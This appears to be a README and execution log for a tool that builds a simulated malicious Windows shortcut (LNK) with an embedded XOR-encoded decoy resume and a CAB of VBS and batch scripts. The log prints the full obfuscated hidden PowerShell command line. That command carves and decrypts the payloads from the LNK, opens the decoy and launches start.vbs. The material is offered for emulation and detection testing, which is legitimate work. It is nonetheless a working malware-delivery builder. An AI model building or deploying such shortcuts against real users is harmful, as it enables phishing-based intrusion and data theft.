by. @tccontre18 - Br3akp0int
# Description
This simple tool will help to generate an LNK with embedded dummy docx and generated cab files to simulate the malicious LNK that uses this technique to collect and exfiltrate 
information on the target host.

# How
1. just click the `generate_lnk_cab.bat`
2. the look for the `fatlnk.lnk-1` file generated by the tool.
3. then test it :D

# example execution

```

C:\malware\lnk-simulation>echo "generate a cab file" 
"generate a cab file"

C:\malware\lnk-simulation>call createcab.bat 

C:\malware\lnk-simulation>makecab /F simi.ddf 
Cabinet Maker - Lossless Data Compression Tool

Parsing directives
Parsing directives (simi.ddf: 1 lines)
168,760 bytes in 4 files              
Executing directives
  0.00% - msg.vbs (1 of 4)
  0.00% - simi.bat (2 of 4)
  0.00% - start.vbs (3 of 4)
  0.00% - unzip.exe (4 of 4)
 19.42% - unzip.exe (4 of 4)
 38.83% - unzip.exe (4 of 4)
 58.25% - unzip.exe (4 of 4)
 77.67% - unzip.exe (4 of 4)
 97.08% - unzip.exe (4 of 4)
100.00% - unzip.exe (4 of 4)
  0.00% [flushing current folder]
 18.93% [flushing current folder]
 40.76% [flushing current folder]
 65.82% [flushing current folder]
 88.00% [flushing current folder]
 99.11% [flushing current folder]
 99.76% [flushing current folder]
  0.13% [flushing current folder]
 41.65% [flushing current folder]
 83.17% [flushing current folder]
100.00% [flushing current folder]
Total files:              4      
Bytes before:       168,760
Bytes after:         78,770
After/Before:            46.68% compression
Time:                     0.03 seconds ( 0 hr  0 min  0.03 sec)
Throughput:            5316.28 Kb/second

C:\malware\lnk-simulation>copy .\disk1\1.cab . 
        1 file(s) copied.

C:\malware\lnk-simulation>echo "created a xored doc and cab file" 
"created a xored doc and cab file"

C:\malware\lnk-simulation>python xored.py -f Resume.docx -k 51 
[+] File Name: Resume.docx
[+] Xor Key: b'Q'
[+] File Size to be xor-ed: 9852
[+] Successfully xored Resume.docx -> xored_Resume.docx

C:\malware\lnk-simulation>python xored.py -f 1.cab -k 88 
[+] File Name: 1.cab
[+] Xor Key: b'\x88'
[+] File Size to be xor-ed: 78963
[+] Successfully xored 1.cab -> xored_1.cab

C:\malware\lnk-simulation>echo "generate resume.lnk file" 
"generate resume.lnk file"

C:\malware\lnk-simulation>python clink.py 

Target file:
{ 'archive': False,
  'compressed': False,
  'directory': False,
  'encrypted': False,
  'hidden': False,
  'normal': False,
  'not_content_indexed': False,
  'offline': False,
  'read_only': False,
  'reparse_point': False,
  'reserved1': False,
  'reserved2': False,
  'sparse_file': False,
  'system_file': False,
  'temporary': False}
Creation Time: 2024-05-17 04:40:46.010255
Modification Time: 2024-05-17 04:40:46.010255
Access Time: 2024-05-17 04:40:46.010255
File size: 0
Window mode: Minimized
Hotkey: None
None
<LinkTargetIDList>:
  <RootEntry: MY_COMPUTER>
  <DriveEntry: b'C:'>
  <PathSegmentEntry: Windows>
  <PathSegmentEntry: System32>
  <PathSegmentEntry: cmd.exe>
Description: test
Commandline Arguments: /c p^owe^rshe^l^l -windowstyle hidden function mw_decrypt_portion_of_lnk {   param($param_filePath,$offset,$param_byte_array_len,$param_decryption_key,$param_save_file);   $wStream=New-Object System.IO.FileStream($param_filePath,[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read);   $wStream.Seek($offset,[System.IO.SeekOrigin]::Begin);   $buffer=New-Object byte[] $param_byte_array_len;   $wStream.Read($buffer,0,$param_byte_array_len);   $wStream.Close();   for($index_ptr=0; $index_ptr -lt $param_byte_array_len; $index_ptr++)   {     $buffer[$index_ptr]=$buffer[$index_ptr] -bxor $param_decryption_key;   }   sc $param_save_file  $buffer -Encoding  Byte; };  $curDir = Get-Location; Write-Host $curDir;  $expandedCabDirPath = Join-Path -Path $curDir -ChildPath 'documents'; New-Item -ItemType Directory -Path $expandedCabDirPath; $cabFilePath = Join-Path -Path $curDir -ChildPath 'UHCYbG.cab';  $docFilePath = Join-Path -Path $curDir -ChildPath 'Resume.docx'; $lnkFilePath = Join-Path -Path $curDir -ChildPath 'fatlnk.lnk'; $vbsFilePath = Join-Path -Path $expandedCabDirPath -ChildPath 'start.vbs';  Write-Host $cabFilePath; Write-Host $docFilePath; Write-Host $lnkFilePath; mw_decrypt_portion_of_lnk -param_filePath  $lnkFilePath -offset  0x00001000 -param_byte_array_len 0x13479 -param_decryption_key  0x88 -param_save_file  $cabFilePath;  mw_decrypt_portion_of_lnk -param_filePath  $lnkFilePath -offset  0x00014473 -param_byte_array_len 0x267c -param_decryption_key  0x51 -param_save_file  $docFilePath;  Start-Process $docFilePath; expand $cabFilePath -F:* $expandedCabDirPath; Start-Process $vbsFilePath;
Icon: C:\Windows\System32\notepad.exe

Target file:
{ 'archive': False,
  'compressed': False,
  'directory': False,
  'encrypted': False,
  'hidden': False,
  'normal': False,
  'not_content_indexed': False,
  'offline': False,
  'read_only': False,
  'reparse_point': False,
  'reserved1': False,
  'reserved2': False,
  'sparse_file': False,
  'system_file': False,
  'temporary': False}
Creation Time: 2024-05-17 04:40:46
Modification Time: 2024-05-17 04:40:46
Access Time: 2024-05-17 04:40:46
File size: 0
Window mode: Minimized
Hotkey: 
File Location Info: <not specified>
<LinkTargetIDList>:
  <RootEntry: MY_COMPUTER>
  <DriveEntry: b'C:'>
  <PathSegmentEntry: Windows>
  <PathSegmentEntry: System32>
  <PathSegmentEntry: cmd.exe>
Description: test
Commandline Arguments: /c p^owe^rshe^l^l -windowstyle hidden function mw_decrypt_portion_of_lnk {   param($param_filePath,$offset,$param_byte_array_len,$param_decryption_key,$param_save_file);   $wStream=New-Object System.IO.FileStream($param_filePath,[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read);   $wStream.Seek($offset,[System.IO.SeekOrigin]::Begin);   $buffer=New-Object byte[] $param_byte_array_len;   $wStream.Read($buffer,0,$param_byte_array_len);   $wStream.Close();   for($index_ptr=0; $index_ptr -lt $param_byte_array_len; $index_ptr++)   {     $buffer[$index_ptr]=$buffer[$index_ptr] -bxor $param_decryption_key;   }   sc $param_save_file  $buffer -Encoding  Byte; };  $curDir = Get-Location; Write-Host $curDir;  $expandedCabDirPath = Join-Path -Path $curDir -ChildPath 'documents'; New-Item -ItemType Directory -Path $expandedCabDirPath; $cabFilePath = Join-Path -Path $curDir -ChildPath 'UHCYbG.cab';  $docFilePath = Join-Path -Path $curDir -ChildPath 'Resume.docx'; $lnkFilePath = Join-Path -Path $curDir -ChildPath 'fatlnk.lnk'; $vbsFilePath = Join-Path -Path $expandedCabDirPath -ChildPath 'start.vbs';  Write-Host $cabFilePath; Write-Host $docFilePath; Write-Host $lnkFilePath; mw_decrypt_portion_of_lnk -param_filePath  $lnkFilePath -offset  0x00001000 -param_byte_array_len 0x13479 -param_decryption_key  0x88 -param_save_file  $cabFilePath;  mw_decrypt_portion_of_lnk -param_filePath  $lnkFilePath -offset  0x00014473 -param_byte_array_len 0x267c -param_decryption_key  0x51 -param_save_file  $docFilePath;  Start-Process $docFilePath; expand $cabFilePath -F:* $expandedCabDirPath; Start-Process $vbsFilePath;
Icon: C:\Windows\System32\notepad.exe
Used Path: C:\Windows\System32\cmd.exe

C:\malware\lnk-simulation>echo "generate fatlink.lnk embedding xored cab and docx" 
"generate fatlink.lnk embedding xored cab and docx"

C:\malware\lnk-simulation>python embed_lnk.py 
[+] fatlnk.lnk-1 fully generated!

C:\malware\lnk-simulation>rem mkdir test_output_link 

C:\malware\lnk-simulation>rem copy fatlnk.lnk-1 .\test_output_link\fatlink.lnk-1 

```
